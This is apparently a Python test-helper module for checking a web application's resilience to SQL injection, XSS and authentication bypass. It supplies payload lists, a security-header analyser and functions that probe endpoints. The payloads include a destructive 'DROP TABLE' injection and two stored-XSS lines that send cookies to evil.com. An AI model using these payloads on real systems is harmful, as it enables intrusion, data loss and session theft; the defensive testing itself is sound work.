"""Security testing utilities — payload lists and vulnerability scanners.

Provides common security payloads and test helpers for verifying
application resilience against injection attacks::

    from ankole.testing.security import SQLInjectionPayloads, test_injection_resilience

    vulns = test_injection_resilience(api_driver, "/api/search", "query")
    assert len(vulns) == 0, f"Injection vulnerabilities found: {vulns}"
"""

from __future__ import annotations

import logging
from dataclasses import dataclass, field
from typing import Any

logger = logging.getLogger(__name__)


class SQLInjectionPayloads:
    """Common SQL injection test payloads."""

    COMMON = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "1; DROP TABLE members; --",
        "' UNION SELECT NULL, NULL, NULL --",
        "1' AND '1'='1",
        "' OR 1=1 --",
        "admin'--",
        "1 OR 1=1",
        "' OR ''='",
    ]

    BLIND = [
        "' AND SLEEP(5) --",
        "' AND 1=1 --",
        "' AND 1=2 --",
        "1' WAITFOR DELAY '0:0:5' --",
        "' OR IF(1=1, SLEEP(5), 0) --",
    ]


class XSSPayloads:
    """Common XSS test payloads."""

    COMMON = [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert('xss')>",
        "<svg onload=alert('xss')>",
        "javascript:alert('xss')",
        "'><script>alert('xss')</script>",
        '"><img src=x onerror=alert("xss")>',
        "<body onload=alert('xss')>",
        "<iframe src=javascript:alert('xss')>",
    ]

    STORED = [
        "<script>document.location='http://evil.com/?c='+document.cookie</script>",
        "<img src=x onerror=fetch('http://evil.com/?c='+document.cookie)>",
    ]


class AuthBypassPayloads:
    """Authentication bypass test data."""

    WEAK_PASSWORDS = [
        "password", "123456", "admin", "password123",
        "12345678", "qwerty", "abc123", "letmein",
    ]

    HEADER_BYPASSES = [
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Original-URL": "/admin"},
        {"X-Rewrite-URL": "/admin"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
    ]


@dataclass
class SecurityHeadersReport:
    """Report on security-related HTTP headers."""

    url: str
    headers: dict[str, str] = field(default_factory=dict)
    missing: list[str] = field(default_factory=list)
    warnings: list[str] = field(default_factory=list)

    RECOMMENDED_HEADERS = {
        "X-Content-Type-Options": "nosniff",
        "X-Frame-Options": ["DENY", "SAMEORIGIN"],
        "X-XSS-Protection": "0",
        "Strict-Transport-Security": None,  # Any value is OK
        "Content-Security-Policy": None,
        "Referrer-Policy": None,
    }

    def analyze(self) -> "SecurityHeadersReport":
        """Analyze headers against security best practices."""
        self.missing = []
        self.warnings = []

        for header, expected in self.RECOMMENDED_HEADERS.items():
            actual = self.headers.get(header)
            if actual is None:
                self.missing.append(header)
            elif expected is not None:
                if isinstance(expected, list):
                    if actual not in expected:
                        self.warnings.append(
                            f"{header}: got '{actual}', expected one of {expected}"
                        )
                elif actual != expected:
                    self.warnings.append(
                        f"{header}: got '{actual}', expected '{expected}'"
                    )

        return self

    def assert_secure(self, allow_missing: list[str] | None = None) -> "SecurityHeadersReport":
        """Assert all recommended security headers are present.

        Args:
            allow_missing: Headers that are OK to be missing.
        """
        allow = set(allow_missing or [])
        critical_missing = [h for h in self.missing if h not in allow]
        issues = []
        if critical_missing:
            issues.append(f"Missing headers: {critical_missing}")
        if self.warnings:
            issues.append(f"Header warnings: {self.warnings}")
        if issues:
            raise AssertionError(
                f"Security header issues at {self.url}:\n" + "\n".join(issues)
            )
        return self

    @classmethod
    def from_response(cls, url: str, response: Any) -> "SecurityHeadersReport":
        """Create report from an APIResponse."""
        headers = {}
        if hasattr(response, "headers"):
            headers = {k: v for k, v in response.headers.items()}
        return cls(url=url, headers=headers).analyze()


def test_injection_resilience(
    api_driver: Any,
    endpoint: str,
    field_name: str,
    method: str = "POST",
    payloads: list[str] | None = None,
) -> list[dict[str, Any]]:
    """Test an endpoint's resilience against injection attacks.

    Sends each payload to the endpoint and checks for error responses
    that might indicate vulnerability (e.g., 500 errors, SQL error messages).

    Args:
        api_driver: Authenticated APIDriver instance.
        endpoint: API endpoint path.
        field_name: Field name to inject into.
        method: HTTP method to use.
        payloads: Custom payloads (default: SQLInjectionPayloads.COMMON).

    Returns:
        List of dicts describing potential vulnerabilities.
    """
    if payloads is None:
        payloads = SQLInjectionPayloads.COMMON

    vulnerabilities = []
    sql_error_indicators = [
        "sql", "syntax error", "mysql", "postgresql", "sqlite",
        "oracle", "unterminated", "unexpected", "database",
    ]

    for payload in payloads:
        try:
            data = {field_name: payload}
            if method.upper() == "GET":
                resp = api_driver.get(endpoint, params=data)
            else:
                resp = api_driver.post(endpoint, json=data)

            # Check for indicators of vulnerability
            response_text = resp.text.lower() if resp.text else ""
            is_server_error = resp.status_code >= 500
            has_sql_error = any(ind in response_text for ind in sql_error_indicators)

            if is_server_error or has_sql_error:
                vulnerabilities.append({
                    "payload": payload,
                    "status_code": resp.status_code,
                    "indicator": "server_error" if is_server_error else "sql_error_in_response",
                    "response_snippet": resp.text[:200] if resp.text else "",
                })
                logger.warning(
                    f"Potential injection vulnerability: {endpoint} "
                    f"with payload '{payload[:50]}' -> {resp.status_code}"
                )
        except Exception as e:
            logger.debug(f"Injection test error for '{payload[:30]}': {e}")

    return vulnerabilities


def test_auth_endpoints_require_token(
    api_driver: Any,
    endpoints: list[dict[str, str]],
) -> list[dict[str, Any]]:
    """Test that protected endpoints reject unauthenticated requests.

    Args:
        api_driver: APIDriver instance (NOT authenticated).
        endpoints: List of dicts with "method" and "path" keys.

    Returns:
        List of endpoints that did NOT return 401/403.
    """
    unprotected = []

    for ep in endpoints:
        method = ep.get("method", "GET").upper()
        path = ep["path"]

        try:
            if method == "GET":
                resp = api_driver.get(path)
            elif method == "POST":
                resp = api_driver.post(path, json={})
            elif method == "PUT":
                resp = api_driver.put(path, json={})
            elif method == "DELETE":
                resp = api_driver.delete(path)
            else:
                resp = api_driver.get(path)

            if resp.status_code not in (401, 403):
                unprotected.append({
                    "method": method,
                    "path": path,
                    "status_code": resp.status_code,
                })
                logger.warning(
                    f"Unprotected endpoint: {method} {path} -> {resp.status_code}"
                )
        except Exception as e:
            logger.debug(f"Auth test error for {method} {path}: {e}")

    return unprotected
